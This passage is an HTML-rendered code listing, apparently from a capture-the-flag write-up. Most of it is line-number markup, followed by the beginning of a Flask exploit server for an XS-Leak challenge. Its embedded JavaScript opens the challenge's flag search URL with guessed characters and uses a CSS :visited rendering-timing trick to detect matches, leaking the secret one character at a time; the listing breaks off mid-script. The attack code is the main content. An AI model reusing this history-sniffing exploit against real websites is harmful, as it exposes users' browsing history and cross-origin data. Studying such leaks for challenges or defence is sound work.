+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">135
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">136
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">137
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">138
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">139
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">140
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">141
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">142
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">143
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">144
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">145
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">146
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">147
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">148
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">149
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">150
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">151
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">152
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">153
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">154
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">155
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">156
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">157
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">158
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">159
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">160
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">161
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">162
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">163
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">164
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">165
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">166
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">167
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">168
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">169
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">170
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">171
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">172
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">173
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">174
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">175
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">176
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">177
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">178
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">179
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">180
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">181
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">182
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">183
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">184
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">185
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">186
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">187
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">188
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">189
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">190
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">191
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">192
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">193
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">194
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">195
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">196
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">197
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">198
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">199
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">200
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">201
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">202
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">203
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">204
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">205
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">206
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">207
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">208
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">209
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">210
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">211
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">212
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">213
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">214
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">215
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">216
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">217
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">218
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">219
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">220
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">221
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">222
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">223
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">224
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">225
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">226
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">227
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">228
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">229
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">230
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">231
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">232
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">233
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">234
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">235
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">236
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">237
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">238
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">239
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">240
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">241
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">242
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">243
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">244
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">245
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">246
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">247
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">248
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">249
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">250
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">251
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">252
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">253
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">254
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">255
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">256
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">257
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">258
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">259
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">260
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">261
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">262
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">from</span> flask <span style="color:#ff6ac1">import</span> Flask, render_template_string, request
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#ff6ac1">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>URL <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;http://127.0.0.1:21111/&#34;</span>
+</span></span><span style="display:flex;"><span>CHARSET <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;1234567890&#34;</span> <span style="color:#78787e"># for local testing </span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e">#CHARSET = &#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#34;</span>
+</span></span><span style="display:flex;"><span>ex_html <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;!DOCTYPE html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;html lang=&#34;en&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;meta charset=&#34;UTF-8&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;title&gt;XS-Leak Test&lt;/title&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;style type=&#34;text/css&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        /* Set it up so the target link element has different colors when pointing to a
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">           visited vs unvisited URL. */
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        #target {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            color: white;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            background-color: white;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            outline-color: white;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        }
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        #target:visited {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            color: #feffff;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            background-color: #fffeff;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            outline-color: #fffffe;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        }
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;/style&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;/head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    async function isVisited(url) {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        let pocw = window.open(`/poc?url=${encodeURIComponent(url)}`, &#39;poc&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        pocw.focus();
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    // Extract the fragment identifier from the URL
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    let hash = window.location.hash.substring(1) || &#34;flag{g68r|a&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    let [guess, current_guess] = hash.split(&#39;|&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    let base_url = &#39;{{CHALLENGE_URL}}search?q=flag{&#39;; //change based on flag format
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    let charset = &#39;{{ CHARSET }}&#39;.split(&#39;&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    async function exploit(current_guess) {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        let w = open(`$</span><span style="color:#5af78e">{base_url}</span><span style="color:#5af78e">$</span><span style="color:#5af78e">{guess}</span><span style="color:#5af78e">$</span><span style="color:#5af78e">{current_guess}</span><span style="color:#5af78e">`, &#39;guess&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        await new Promise((resolve) =&gt; setTimeout(resolve, 1000));
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        w.close();
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        isVisited(`$</span><span style="color:#5af78e">{base_url}</span><span style="color:#5af78e">$</span><span style="color:#5af78e">{guess}</span><span style="color:#5af78e">$</span><span style="color:#5af78e">{current_guess}</span><span style="color:#5af78e">`);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    exploit(current_guess);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;/script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;/body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;/html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>poc_html <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;!doctype html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;html lang=&#34;en&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;meta charset=&#34;utf-8&#34;/&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;style type=&#34;text/css&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        #target {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            color: white;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            background-color: white;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            outline-color: white;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        }
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        #target:visited {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            color: #feffff;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            background-color: #fffeff;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            outline-color: #fffffe;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        }
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;/style&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;/head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;div id=&#34;entryDisplay&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        Enter a URL to test for visited status:
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        &lt;input id=&#34;urlInput&#34; type=&#34;text&#34; size=&#34;60&#34; value=&#34;{{ url }}&#34; autofocus/&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        &lt;button id=&#34;testButton&#34;&gt;Test&lt;/button&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;script type=&#34;text/javascript&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        (function () {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var entryDisplay = document.getElementById(&#39;entryDisplay&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var urlInput = document.getElementById(&#39;urlInput&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var testButton = document.getElementById(&#39;testButton&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var basisUrl;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var controlUrl;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var experimentUrl;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var targetLink;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var controlTickCount;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            function generateUnvisitedUrl () {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                return &#39;https://&#39; + Math.random() + &#39;/&#39; + Date.now();
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            }
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            testButton.addEventListener(&#39;click&#39;, function () {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                basisUrl = generateUnvisitedUrl();
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                controlUrl = generateUnvisitedUrl();
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                experimentUrl = urlInput.value;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                console.log({ experimentUrl })
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                entryDisplay.remove();
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                document.body.style.overflow = &#39;hidden&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink = document.createElement(&#39;a&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.id = &#39;target&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.href = basisUrl;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                var garbageText = &#39;業雲多受片主...&#39;.repeat(28);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.appendChild(document.createTextNode(garbageText));
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.style.display = &#39;block&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.style.width = &#39;5px&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.style.fontSize = &#39;2px&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.style.outlineWidth = &#39;24px&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.style.textAlign = &#39;center&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.style.filter =
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    &#39;contrast(200%) drop-shadow(16px 16px 10px #fefefe) saturate(200%)&#39;;
